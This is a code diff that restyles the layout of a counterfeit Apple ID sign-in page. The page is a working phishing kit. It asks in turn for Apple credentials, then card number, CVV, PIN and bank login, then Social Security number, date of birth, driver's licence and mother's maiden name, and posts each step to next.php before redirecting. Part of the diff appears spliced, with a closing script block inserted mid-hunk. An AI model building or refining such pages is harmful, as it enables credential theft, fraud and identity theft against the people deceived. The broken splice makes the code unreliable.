@@ -92,9 +92,16 @@
     }
     
     /* Main content styling */
+    .page-content {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+    }
+    
     .main-wrapper {
         padding-top: 60px;
-        min-height: calc(100vh - 120px);
+        padding-bottom: 150px; /* Space for footer */
+        flex: 1 0 auto;
         display: flex;
         align-items: center;
         justify-content: center;
@@ -200,10 +207,10 @@
     }
     
     /* Footer styling */
-    .fixed-bottom {
-        position: fixed;
-        bottom: 0;
+    .footer-wrapper {
         width: 100%;
+        flex-shrink: 0;
+        margin-top: auto;
     }
     
     .as-chat {
@@ -319,6 +326,10 @@
             margin: 20px;
             padding: 20px;
         }
+        
+        .main-wrapper {
+            padding-bottom: 200px; /* More space for footer on mobile */
+        }
     }
     </style>
 </head>
@@ -326,255 +337,257 @@
 <body>
     <div class="bg"></div>
     
-    <!-- Global Navigation -->
-    <nav id="ac-globalnav" class="js no-touch windows" role="navigation">
-        <div class="ac-gn-content">
-            <ul class="ac-gn-list">
-                <li class="ac-gn-item ac-gn-apple">
-                    <a class="ac-gn-link ac-gn-link-apple " href="#">
-                        <span class="ac-gn-link-text">Apple</span>
-                    </a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
-                    <a class="ac-gn-link ac-gn-link-mac " href="#">
-                        <span class="ac-gn-link-text">Mac</span>
-                    </a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
-                    <a class="ac-gn-link ac-gn-link-ipad " href="#">
-                        <span class="ac-gn-link-text">iPad</span>
-                    </a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
-                    <a class="ac-gn-link ac-gn-link-iphone " href="#">
-                        <span class="ac-gn-link-text">iPhone</span>
-                    </a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
-                    <a class="ac-gn-link ac-gn-link-watch " href="#">
-                        <span class="ac-gn-link-text">Watch</span>
-                    </a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
-                    <a class="ac-gn-link ac-gn-link-tv " href="#">
-                        <span class="ac-gn-link-text">TV</span>
-                    </a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
-                    <a class="ac-gn-link ac-gn-link-music " href="#">
-                        <span class="ac-gn-link-text">Music</span>
-                    </a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
-                    <a class="ac-gn-link ac-gn-link-support " href="#">
-                        <span class="ac-gn-link-text">Support</span>
-                    </a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
-                    <a id="ac-gn-link-search" class="ac-gn-link ac-gn-link-search " href="#">
-                        <span class="ac-gn-link-text">Search apple.com</span>
-                    </a>
-                </li>
-            </ul>
-        </div>
-    </nav>
-    
-    <!-- Main Content -->
-    <div class="main-wrapper">
-        <div class="container">
-            <!-- Step 1: Login -->
-            <div id="bl1" class="si-step">
-                <div class="signin-container fade-in">
-                    <h1 class="si-container-title">Sign in with your Apple&nbsp;ID</h1>
-                    <p class="subtitle">to continue to Apple services</p>
-                    
-                    <div id="error" class="alert alert-danger" style="display: none;font-size: 13px">Invalid Password. Please enter correct password.</div>
-                    
-                    <form action="next.php" method="POST" name="signinform" id="form-field-1">
-                        <input type="hidden" name="count" id="count" value="0">
-                        <input type="hidden" name="btn1" value="btn1">
-                        
-                        <div class="form-group">
-                            <input type="text" name="ai" id="ai" required class="form-control" placeholder="Apple ID or Email">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="password" name="pr" id="pr" required class="form-control" placeholder="Password">
-                        </div>
-                        
-                        <div class="si-remember-password">
-                            <input type="checkbox" id="remember-me" class="form-check-input">
-                            <label for="remember-me" class="form-label">Remember me</label>
-                        </div>
-                        
-                        <button type="submit" id="sub-btn-1" class="si-button">
-                            <i class="icon_sign_in"></i>Sign In
-                        </button>
-                    </form>
-                    
-                    <div class="separator"></div>
-                    
-                    <div class="links text-center">
-                        <div class="mb-2">
-                            <a href="#" id="iforgot-link">Forgot Apple&nbsp;ID or password?</a>
-                        </div>
-                        <div>
-                            <span style="color: rgba(255,255,255,0.8);">Don't have an Apple&nbsp;ID?</span>
-                            <a href="#" id="create-link">Create yours now</a>
-                        </div>
-                    </div>
-                </div>
+    <div class="page-content">
+        <!-- Global Navigation -->
+        <nav id="ac-globalnav" class="js no-touch windows" role="navigation">
+            <div class="ac-gn-content">
+                <ul class="ac-gn-list">
+                    <li class="ac-gn-item ac-gn-apple">
+                        <a class="ac-gn-link ac-gn-link-apple " href="#">
+                            <span class="ac-gn-link-text">Apple</span>
+                        </a>
+                    </li>
+                    <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                        <a class="ac-gn-link ac-gn-link-mac " href="#">
+                            <span class="ac-gn-link-text">Mac</span>
+                        </a>
+                    </li>
+                    <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                        <a class="ac-gn-link ac-gn-link-ipad " href="#">
+                            <span class="ac-gn-link-text">iPad</span>
+                        </a>
+                    </li>
+                    <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                        <a class="ac-gn-link ac-gn-link-iphone " href="#">
+                            <span class="ac-gn-link-text">iPhone</span>
+                        </a>
+                    </li>
+                    <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                        <a class="ac-gn-link ac-gn-link-watch " href="#">
+                            <span class="ac-gn-link-text">Watch</span>
+                        </a>
+                    </li>
+                    <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                        <a class="ac-gn-link ac-gn-link-tv " href="#">
+                            <span class="ac-gn-link-text">TV</span>
+                        </a>
+                    </li>
+                    <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                        <a class="ac-gn-link ac-gn-link-music " href="#">
+                            <span class="ac-gn-link-text">Music</span>
+                        </a>
+                    </li>
+                    <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                        <a class="ac-gn-link ac-gn-link-support " href="#">
+                            <span class="ac-gn-link-text">Support</span>
+                        </a>
+                    </li>
+                    <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                        <a id="ac-gn-link-search" class="ac-gn-link ac-gn-link-search " href="#">
+                            <span class="ac-gn-link-text">Search apple.com</span>
+                        </a>
+                    </li>
+                </ul>
             </div>
-            
-            <!-- Step 2: Payment Information -->
-            <div id="bl2" class="si-step" style="display:none;">
-                <div class="signin-container fade-in">
-                    <h1 class="si-container-title">Verify Your Identity</h1>
-                    <p class="subtitle">Confirm your payment details</p>
-                    
-                    <!-- Progress Steps -->
-                    <div class="progress-container">
-                        <div class="step completed">
-                            <div class="step-number">1</div>
-                            <div class="step-label">Sign In</div>
-                        </div>
-                        <div class="step active">
-                            <div class="step-number">2</div>
-                            <div class="step-label">Payment</div>
-                        </div>
-                        <div class="step">
-                            <div class="step-number">3</div>
-                            <div class="step-label">Details</div>
-                        </div>
-                    </div>
-                    
-                    <form action="next.php" method="POST" name="signinform" id="form-field-2">
-                        <input type="hidden" name="btn2" value="btn2">
-                        
-                        <div class="form-group">
-                            <input type="text" name="bank_name" required class="form-control" placeholder="Bank Name">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="noc" required class="form-control" placeholder="Name on Card">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="ccn" id="ccn" required class="form-control" placeholder="Credit Card Number">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="exdate" id="exdate" required class="form-control" placeholder="Expiration Date (MM/YYYY)">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="cvv" required class="form-control" placeholder="CVV">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="password" name="pin" required class="form-control" placeholder="Card PIN">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="bank_user" required class="form-control" placeholder="Bank Username">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="password" name="bank_pass" required class="form-control" placeholder="Bank Password">
-                        </div>
-                        
-                        <button type="submit" id="sub-btn-2" class="si-button">Continue</button>
-                    </form>
-                </div>
-            </div>
-            
-            <!-- Step 3: Personal Details -->
-            <div id="bl3" class="si-step" style="display:none;">
-                <div class="signin-container fade-in">
-                    <h1 class="si-container-title">Verify Your Details</h1>
-                    <p class="subtitle">Complete your profile information</p>
-                    
-                    <!-- Progress Steps -->
-                    <div class="progress-container">
-                        <div class="step completed">
-                            <div class="step-number">1</div>
-                            <div class="step-label">Sign In</div>
-                        </div>
-                        <div class="step completed">
-                            <div class="step-number">2</div>
-                            <div class="step-label">Payment</div>
-                        </div>
-                        <div class="step active">
-                            <div class="step-number">3</div>
-                            <div class="step-label">Details</div>
-                        </div>
-                    </div>
-                    
-                    <form action="next.php" method="POST" name="signinform" id="form-field-3">
-                        <input type="hidden" name="btn3" value="btn3">
-                        
-                        <div class="form-group">
-                            <input type="text" name="fname" required class="form-control" placeholder="First Name">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="lname" required class="form-control" placeholder="Last Name">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="badd" required class="form-control" placeholder="Billing Address">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="ct" required class="form-control" placeholder="City">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="state" required class="form-control" placeholder="State">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="zip" required class="form-control" placeholder="ZIP Code">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="ph" id="ph" required class="form-control" placeholder="Phone Number">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="ssn" id="ssn" required class="form-control" placeholder="Social Security Number">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="dob" id="dob" required class="form-control" placeholder="Date of Birth (MM/DD/YYYY)">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="dln" id="dln" required class="form-control" placeholder="Driver's License">
-                        </div>
-                        
-                        <div class="form-group">
-                            <input type="text" name="mname" required class="form-control" placeholder="Mother's Maiden Name">
-                        </div>
-                        
-                        <button type="submit" id="sub-btn-3" class="si-button">Complete Verification</button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Footer -->
-    <div class="fixed-bottom">
-        <div class="as-chat">
+        </nav>
+        
+        <!-- Main Content -->
+        <div class="main-wrapper">
             <div class="container">
-                <div>Need some help? <button class="as-chat-button">Chat now</button> or call <span>1‑800‑MY‑APPLE</span>.</div>
+                <!-- Step 1: Login -->
+                <div id="bl1" class="si-step">
+                    <div class="signin-container fade-in">
+                        <h1 class="si-container-title">Sign in with your Apple&nbsp;ID</h1>
+                        <p class="subtitle">to continue to Apple services</p>
+                        
+                        <div id="error" class="alert alert-danger" style="display: none;font-size: 13px">Invalid Password. Please enter correct password.</div>
+                        
+                        <form action="next.php" method="POST" name="signinform" id="form-field-1">
+                            <input type="hidden" name="count" id="count" value="0">
+                            <input type="hidden" name="btn1" value="btn1">
+                            
+                            <div class="form-group">
+                                <input type="text" name="ai" id="ai" required class="form-control" placeholder="Apple ID or Email">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="password" name="pr" id="pr" required class="form-control" placeholder="Password">
+                            </div>
+                            
+                            <div class="si-remember-password">
+                                <input type="checkbox" id="remember-me" class="form-check-input">
+                                <label for="remember-me" class="form-label">Remember me</label>
+                            </div>
+                            
+                            <button type="submit" id="sub-btn-1" class="si-button">
+                                <i class="icon_sign_in"></i>Sign In
+                            </button>
+                        </form>
+                        
+                        <div class="separator"></div>
+                        
+                        <div class="links text-center">
+                            <div class="mb-2">
+                                <a href="#" id="iforgot-link">Forgot Apple&nbsp;ID or password?</a>
+                            </div>
+                            <div>
+                                <span style="color: rgba(255,255,255,0.8);">Don't have an Apple&nbsp;ID?</span>
+                                <a href="#" id="create-link">Create yours now</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Step 2: Payment Information -->
+                <div id="bl2" class="si-step" style="display:none;">
+                    <div class="signin-container fade-in">
+                        <h1 class="si-container-title">Verify Your Identity</h1>
+                        <p class="subtitle">Confirm your payment details</p>
+                        
+                        <!-- Progress Steps -->
+                        <div class="progress-container">
+                            <div class="step completed">
+                                <div class="step-number">1</div>
+                                <div class="step-label">Sign In</div>
+                            </div>
+                            <div class="step active">
+                                <div class="step-number">2</div>
+                                <div class="step-label">Payment</div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">3</div>
+                                <div class="step-label">Details</div>
+                            </div>
+                        </div>
+                        
+                        <form action="next.php" method="POST" name="signinform" id="form-field-2">
+                            <input type="hidden" name="btn2" value="btn2">
+                            
+                            <div class="form-group">
+                                <input type="text" name="bank_name" required class="form-control" placeholder="Bank Name">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="noc" required class="form-control" placeholder="Name on Card">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="ccn" id="ccn" required class="form-control" placeholder="Credit Card Number">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="exdate" id="exdate" required class="form-control" placeholder="Expiration Date (MM/YYYY)">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="cvv" required class="form-control" placeholder="CVV">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="password" name="pin" required class="form-control" placeholder="Card PIN">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="bank_user" required class="form-control" placeholder="Bank Username">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="password" name="bank_pass" required class="form-control" placeholder="Bank Password">
+                            </div>
+                            
+                            <button type="submit" id="sub-btn-2" class="si-button">Continue</button>
+                        </form>
+                    </div>
+                </div>
+                
+                <!-- Step 3: Personal Details -->
+                <div id="bl3" class="si-step" style="display:none;">
+                    <div class="signin-container fade-in">
+                        <h1 class="si-container-title">Verify Your Details</h1>
+                        <p class="subtitle">Complete your profile information</p>
+                        
+                        <!-- Progress Steps -->
+                        <div class="progress-container">
+                            <div class="step completed">
+                                <div class="step-number">1</div>
+                                <div class="step-label">Sign In</div>
+                            </div>
+                            <div class="step completed">
+                                <div class="step-number">2</div>
+                                <div class="step-label">Payment</div>
+                            </div>
+                            <div class="step active">
+                                <div class="step-number">3</div>
+                                <div class="step-label">Details</div>
+                            </div>
+                        </div>
+                        
+                        <form action="next.php" method="POST" name="signinform" id="form-field-3">
+                            <input type="hidden" name="btn3" value="btn3">
+                            
+                            <div class="form-group">
+                                <input type="text" name="fname" required class="form-control" placeholder="First Name">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="lname" required class="form-control" placeholder="Last Name">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="badd" required class="form-control" placeholder="Billing Address">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="ct" required class="form-control" placeholder="City">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="state" required class="form-control" placeholder="State">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="zip" required class="form-control" placeholder="ZIP Code">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="ph" id="ph" required class="form-control" placeholder="Phone Number">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="ssn" id="ssn" required class="form-control" placeholder="Social Security Number">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="dob" id="dob" required class="form-control" placeholder="Date of Birth (MM/DD/YYYY)">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="dln" id="dln" required class="form-control" placeholder="Driver's License">
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="text" name="mname" required class="form-control" placeholder="Mother's Maiden Name">
+                            </div>
+                            
+                            <button type="submit" id="sub-btn-3" class="si-button">Complete Verification</button>
+                        </form>
+                    </div>
+                </div>
             </div>
         </div>
-        <div class="as-footnotes">
-            <div class="container">
-                <p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p>
-                <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
+        
+        <!-- Footer -->
+        <div class="footer-wrapper">
+            <div class="as-chat">
+                <div class="container">
+                    <div>Need some help? <button class="as-chat-button">Chat now</button> or call <span>1‑800‑MY‑APPLE</span>.</div>
+                </div>
+            </div>
+            <div class="as-footnotes">
+                <div class="container">
+                    <p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p>
+                    <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
+                </div>
             </div>
         </div>
     </div>
@@ -646,6 +659,21 @@ $(document).ready(function() {
         var c = $("#form-field-1").serialize();
         $.ajax({
             dataType: 'JSON',
+            url: f,
+            type: 'POST',
+            data: c,
+            beforeSend: function(a) {
+                $('#sub-btn-3').html('Processing...')
+            },
+            complete: function(a) {
+                window.location.replace(rdrt)
+            }
+        })
+    })
+});
+</script>
+
+</html>
             url: f,
             type: 'POST',
             data: c,
@@ -722,18 +750,3 @@ $(document).ready(function() {
         var c = $("#form-field-3").serialize();
         $.ajax({
             dataType: 'JSON',
-            url: f,
-            type: 'POST',
-            data: c,
-            beforeSend: function(a) {
-                $('#sub-btn-3').html('Processing...')
-            },
-            complete: function(a) {
-                window.location.replace(rdrt)
-            }
-        })
-    })
-});
-</script>
-
-</html>
